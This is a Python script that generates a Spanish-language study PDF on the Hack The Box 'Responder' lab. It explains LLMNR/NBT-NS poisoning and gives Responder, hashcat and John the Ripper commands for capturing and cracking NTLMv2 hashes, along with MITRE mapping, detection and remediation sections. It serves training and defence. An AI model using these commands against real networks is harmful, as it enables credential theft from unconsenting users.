#!/usr/bin/env python3
"""
PDF de teoría — HTB Responder (Tier 1)
Técnica principal: LLMNR/NBT-NS Poisoning + NTLMv2 cracking
RedTeamLab · César Contreras · CPTS 2026
"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pdf_base import *

OUTPUT = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..", "HTB", "Responder", "Teoria_LLMNR_Responder.pdf"
)

S   = make_styles()
doc = make_doc(OUTPUT)
story = []

# ── Portada ───────────────────────────────────────────────────────────────────
story.append(Spacer(1, 1.2*cm))
story.append(Paragraph("HTB Responder — Tier 1", S["title"]))
story.append(Paragraph("LLMNR/NBT-NS Poisoning · Captura y Cracking de NTLMv2", S["sub"]))
story.append(hr())
story.append(Paragraph(
    "Primera máquina Windows del roadmap y primer contacto con captura de hashes NTLM. "
    "Este documento cubre por qué existen LLMNR/NBT-NS, cómo Responder los explota, "
    "qué es un hash NTLMv2 y cómo se crackea, qué detecta el Blue Team, y la conexión "
    "con Active Directory (Fase 2).",
    S["body"]
))
story.append(Spacer(1, 0.4*cm))

# ── 1. Contexto ───────────────────────────────────────────────────────────────
story.append(Paragraph("1. Contexto de la Máquina", S["h1"]))
story.append(hr())
data = [
    ["Campo", "Detalle"],
    ["Tier / Fase",   "Tier 1 — Starting Point"],
    ["OS",            "Windows"],
    ["Dificultad",    "Easy"],
    ["Técnica clave", "LLMNR/NBT-NS Poisoning con Responder + cracking NTLMv2 con hashcat"],
    ["Herramientas",  "Responder, hashcat (o John the Ripper)"],
    ["Vector",        "No es un servicio vulnerable — es un protocolo de red mal diseñado por defecto"],
]
story.append(make_table(data, [CONTENT_W*0.26, CONTENT_W*0.74], S))
story.append(Spacer(1, 0.3*cm))

story.append(Paragraph(
    "⚠️  Diferencia clave respecto a las máquinas anteriores: no hay un puerto que "
    "\"escanear y explotar\". El ataque es pasivo — escuchas la red y esperas (o "
    "provocas) que la víctima cometa un error de resolución de nombres.",
    S["warn"]
))

# ── 2. Fundamentos ────────────────────────────────────────────────────────────
story.append(Paragraph("2. Fundamentos — Resolución de Nombres en Windows", S["h1"]))
story.append(hr())

story.append(Paragraph("2.1 El orden de resolución de nombres", S["h2"]))
story.append(Paragraph(
    "Cuando un host Windows necesita resolver un nombre (por ejemplo, al acceder "
    "a <b>\\\\fileserver\\share</b>), sigue este orden:",
    S["body"]
))
add_code_block(story, S, [
    "1. Caché local de resolución de nombres",
    "2. Servidor DNS configurado",
    "3. LLMNR  (Link-Local Multicast Name Resolution) — UDP/5355",
    "4. NBT-NS (NetBIOS Name Service)               — UDP/137",
])
story.append(Paragraph(
    "Si el DNS no tiene registro para ese nombre (typo, recurso ya no existe, "
    "nombre mal escrito), Windows no se rinde — pregunta a TODA la red local "
    "\"¿alguien es <i>fileserver</i>?\" vía broadcast/multicast. LLMNR y NBT-NS "
    "son ese mecanismo de último recurso, y ninguno de los dos verifica la "
    "identidad de quien responde.",
    S["body"]
))

story.append(Paragraph("2.2 Por qué esto es explotable", S["h2"]))
story.append(Paragraph(
    "Cualquier host en el mismo segmento de red puede responder a esa pregunta "
    "de broadcast diciendo \"soy yo\". El cliente, creyendo que encontró el "
    "recurso legítimo, intenta autenticarse contra él — y en Windows, eso "
    "significa enviar un hash NTLMv2 calculado con la contraseña del usuario. "
    "El atacante nunca pide la contraseña directamente: la víctima se la entrega "
    "sola, sin saberlo, al intentar conectarse a lo que cree que es un recurso real.",
    S["body"]
))
story.append(Paragraph(
    "💡  Esto no requiere ninguna vulnerabilidad de software — es el comportamiento "
    "por defecto de Windows desde hace más de una década. LLMNR/NBT-NS siguen "
    "habilitados por defecto en la mayoría de redes empresariales.",
    S["tip"]
))

story.append(Paragraph("2.3 ¿Qué es un hash NTLMv2?", S["h2"]))
story.append(Paragraph(
    "NTLMv2 es el protocolo de autenticación challenge-response de Windows. "
    "El \"hash\" capturado no es la contraseña ni un hash simple de ella — es una "
    "estructura criptográfica que combina un desafío del servidor (aquí, el "
    "atacante) con el HMAC-MD5 de la contraseña del usuario más metadata "
    "(usuario, dominio, timestamp). No se puede revertir directamente, pero "
    "sí se puede atacar offline probando contraseñas candidatas hasta que el "
    "cálculo coincida — eso es lo que hace hashcat.",
    S["body"]
))

# ── 3. Ejecutar el ataque ─────────────────────────────────────────────────────
story.append(Paragraph("3. Ejecutar el Ataque con Responder", S["h1"]))
story.append(hr())

story.append(Paragraph("3.1 Preparar Responder", S["h2"]))
add_code_block(story, S, [
    "# Responder ya viene instalado en Kali. Verificar:",
    "which responder",
    "",
    "# Identificar la interfaz correcta (la de la VPN de HTB, normalmente tun0)",
    "ip a",
])

story.append(Paragraph("3.2 Lanzar el listener", S["h2"]))
add_code_block(story, S, [
    "sudo responder -I tun0",
    "",
    "# Responder queda escuchando y responderá automáticamente a CUALQUIER",
    "# consulta LLMNR/NBT-NS/mDNS que vea en la red, ofreciéndose como el host",
    "# que se está buscando.",
])
story.append(Paragraph(
    "En un pentest real, este paso puede correr en paralelo horas mientras se "
    "hace otro trabajo — el ataque es completamente pasivo del lado del atacante. "
    "En Starting Point, algo en la máquina objetivo dispara la consulta fallida "
    "por sí solo (no hace falta interacción del atacante más que esperar).",
    S["body"]
))

story.append(Paragraph("3.3 Capturar el hash", S["h2"]))
add_code_block(story, S, [
    "# Responder imprime en pantalla cuando captura un hash, y además lo guarda en:",
    "cat /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP_victima>.txt",
    "",
    "# Formato del hash capturado (ejemplo, valores truncados):",
    "wley::RESPONDER:1122334455667788:AABBCCDD...:0101000000000000...",
])
story.append(Paragraph(
    "El formato ya viene listo para hashcat/John — no requiere edición manual "
    "salvo copiar la línea completa a un archivo propio.",
    S["body"]
))

story.append(Paragraph("3.4 Crackear el hash con hashcat", S["h2"]))
add_code_block(story, S, [
    "hashcat -m 5600 hash_capturado.txt /usr/share/wordlists/rockyou.txt --force",
    "",
    "# -m 5600 → modo NetNTLMv2 en hashcat",
    "# --force → necesario en algunos entornos virtualizados sin GPU dedicada",
    "",
    "# Ver la contraseña ya crackeada (si quedó guardada en el potfile):",
    "hashcat -m 5600 hash_capturado.txt --show",
])
story.append(Paragraph(
    "💡  Alternativa si hashcat no está disponible o falla: John the Ripper con "
    "<b>--format=netntlmv2</b> hace exactamente lo mismo.",
    S["tip"]
))

# ── 4. MITRE ATT&CK ──────────────────────────────────────────────────────────
story.append(Paragraph("4. MITRE ATT&amp;CK — Mapeo de la Técnica", S["h1"]))
story.append(hr())

data2 = [
    ["Táctica", "Técnica", "ID", "Descripción"],
    ["Credential Access", "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning", "T1557.001",
     "Responder captura el hash NTLMv2 respondiendo falsamente a broadcasts"],
    ["Credential Access", "Brute Force: Password Cracking", "T1110.002",
     "hashcat/John crackean el hash offline contra una wordlist"],
]
story.append(make_table(data2, [CONTENT_W*0.20, CONTENT_W*0.30, CONTENT_W*0.14, CONTENT_W*0.36], S))
story.append(Spacer(1, 0.3*cm))

story.append(Paragraph(
    "T1557 (Adversary-in-the-Middle) es la categoría general — el atacante se "
    "posiciona entre la víctima y el recurso que cree estar contactando. "
    "T1557.001 es la subtécnica específica de envenenamiento LLMNR/NBT-NS.",
    S["body"]
))

# ── 5. Blue Team ──────────────────────────────────────────────────────────────
story.append(Paragraph("5. Blue Team — ¿Qué se Detecta?", S["h1"]))
story.append(hr())

story.append(Paragraph("5.1 La señal es de red, no de aplicación", S["h2"]))
detect = [
    "Cualquier host respondiendo a consultas LLMNR (UDP 5355) o NBT-NS (UDP/TCP 137) que no sea el DNS/WINS legítimo es anómalo por diseño — en una red sana, ningún endpoint normal debería contestar estas consultas",
    "Herramientas como Responder tienen firmas de red reconocibles (banner SMB específico, patrones de respuesta) detectables por IDS/NIDS con reglas dedicadas",
    "Autenticaciones NTLM hacia hosts fuera del inventario de servidores conocidos — un log de auth exitosa contra una IP de estación de trabajo normal es una bandera roja",
]
for d in detect:
    story.append(Paragraph(f"• {d}", S["bullet"]))
story.append(Spacer(1, 0.3*cm))

story.append(Paragraph("5.2 Por qué es difícil de ver sin instrumentación específica", S["h2"]))
story.append(Paragraph(
    "A diferencia de SQLi o un login bypass, aquí no hay payload sospechoso ni "
    "petición HTTP anómala que revisar — es tráfico de broadcast a nivel de "
    "protocolo. Sin un IDS con reglas específicas para poisoning, o sin "
    "deshabilitar LLMNR/NBT-NS por política, el ataque es virtualmente invisible "
    "para logging de aplicación estándar. La detección depende 100% de "
    "monitoreo de red, no de logs de servidor.",
    S["body"]
))

# ── 6. Remediación ────────────────────────────────────────────────────────────
story.append(Paragraph("6. Remediación — Cómo se Mitiga", S["h1"]))
story.append(hr())

story.append(Paragraph("6.1 Deshabilitar LLMNR y NBT-NS (fix principal)", S["h2"]))
add_code_block(story, S, [
    "# LLMNR — vía GPO:",
    "Computer Configuration > Administrative Templates > Network >",
    "DNS Client > Turn OFF Multicast Name Resolution = Enabled",
    "",
    "# NBT-NS — por adaptador de red (o vía DHCP option 001 en entorno grande):",
    "Propiedades de red > TCP/IPv4 > Avanzado > WINS >",
    "Deshabilitar NetBIOS sobre TCP/IP",
])

story.append(Paragraph("6.2 Si no se pueden deshabilitar (dependencias legacy)", S["h2"]))
mitigations = [
    "Forzar SMB Signing en todos los hosts — no evita la captura del hash, pero sí evita el relay (reenviarlo para autenticarse en otro sistema sin crackearlo)",
    "Segmentación de red — limitar el alcance del broadcast reduce cuántos hosts puede envenenar un atacante desde un solo punto",
    "IDS/NIDS con reglas específicas para Responder y herramientas de poisoning similares",
    "Políticas de contraseña fuertes — si el hash igual se captura, que no sea crackeable en tiempo razonable",
]
for m in mitigations:
    story.append(Paragraph(f"• {m}", S["bullet"]))

# ── 7. Cheatsheet ─────────────────────────────────────────────────────────────
story.append(Paragraph("7. Cheatsheet — Responder", S["h1"]))
story.append(hr())

add_code_block(story, S, [
    "# 1. Lanzar Responder en la interfaz correcta",
    "sudo responder -I tun0",
    "",
    "# 2. Esperar captura (se imprime en pantalla y se guarda en disco)",
    "cat /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt",
    "",
    "# 3. Crackear con hashcat",
    "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force",
    "",
    "# 4. Ver password ya crackeada",
    "hashcat -m 5600 hash.txt --show",
    "",
    "# Alternativa con John the Ripper:",
    "john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
    "john --show --format=netntlmv2 hash.txt",
])

story.append(Spacer(1, 0.3*cm))
data3 = [
    ["Protocolo", "Puerto", "Rol en el ataque"],
    ["LLMNR",  "UDP 5355", "Fallback de resolución de nombres — primer objetivo de Responder"],
    ["NBT-NS", "UDP/TCP 137", "Fallback heredado de NetBIOS — segundo objetivo"],
    ["SMB",    "TCP 445", "Protocolo donde viaja la autenticación NTLMv2 capturada"],
]
story.append(make_table(data3, [CONTENT_W*0.22, CONTENT_W*0.22, CONTENT_W*0.56], S))

# ── 8. Conexión CPTS ──────────────────────────────────────────────────────────
story.append(Spacer(1, 0.4*cm))
story.append(Paragraph("8. Conexión con CPTS y Active Directory", S["h1"]))
story.append(hr())

story.append(Paragraph(
    "Responder es la puerta de entrada al módulo <b>Active Directory Enumeration "
    "&amp; Attacks</b> del HTB Academy — LLMNR/NBT-NS poisoning es una de las "
    "primeras técnicas que se enseñan para obtener el primer punto de apoyo en "
    "un entorno AD sin credenciales previas.",
    S["body"]
))
connections = [
    "<b>CPTS Exam:</b> LLMNR/NBT-NS poisoning es una técnica estándar de reconocimiento activo en redes con Windows",
    "<b>Progresión natural:</b> Responder (captura pasiva) → máquinas de Fase 2 (AD) donde el hash o la credencial obtenida se usa para movimiento lateral real",
    "<b>Engagement real:</b> en redes empresariales chilenas/latam es extremadamente común encontrar LLMNR/NBT-NS habilitados por defecto — hallazgo de alto impacto y bajo esfuerzo para un reporte",
]
for c in connections:
    story.append(Paragraph(f"• {c}", S["bullet"]))

# ── Footer ────────────────────────────────────────────────────────────────────
story.append(Spacer(1, 0.3*cm))
story.extend(footer_line(S, "Responder", "2026"))
doc.build(story)
print(f"PDF generado: {OUTPUT}")
